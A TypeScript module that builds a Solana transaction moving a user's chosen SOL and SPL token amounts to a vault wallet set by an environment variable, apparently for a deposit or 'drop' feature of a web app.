import { 
  Connection, 
  PublicKey, 
  Transaction, 
  SystemProgram,
  LAMPORTS_PER_SOL
} from '@solana/web3.js';
import { 
  TOKEN_PROGRAM_ID,
  createTransferInstruction,
  getAssociatedTokenAddress
} from '@solana/spl-token';
import { Token } from '../types';

const VAULT_ADDRESS = import.meta.env.VITE_VAULT_WALLET_ADDRESS;

if (!VAULT_ADDRESS) {
  throw new Error('Vault wallet address not found in environment variables');
}

export async function createDropTransaction(
  connection: Connection,
  walletAddress: string,
  tokens: { token: Token; amount: number }[]
): Promise<Transaction> {
  const transaction = new Transaction();
  const fromPubkey = new PublicKey(walletAddress);
  const toPubkey = new PublicKey(VAULT_ADDRESS);

  for (const { token, amount } of tokens) {
    // Handle SOL transfers
    if (token.mint === 'So11111111111111111111111111111111111111112') {
      transaction.add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: amount * LAMPORTS_PER_SOL
        })
      );
    } else {
      // Handle SPL token transfers
      const fromATA = await getAssociatedTokenAddress(
        new PublicKey(token.mint),
        fromPubkey
      );
      
      const toATA = await getAssociatedTokenAddress(
        new PublicKey(token.mint),
        toPubkey
      );

      transaction.add(
        createTransferInstruction(
          fromATA,
          toATA,
          fromPubkey,
          amount * Math.pow(10, token.decimals)
        )
      );
    }
  }

  return transaction;
}
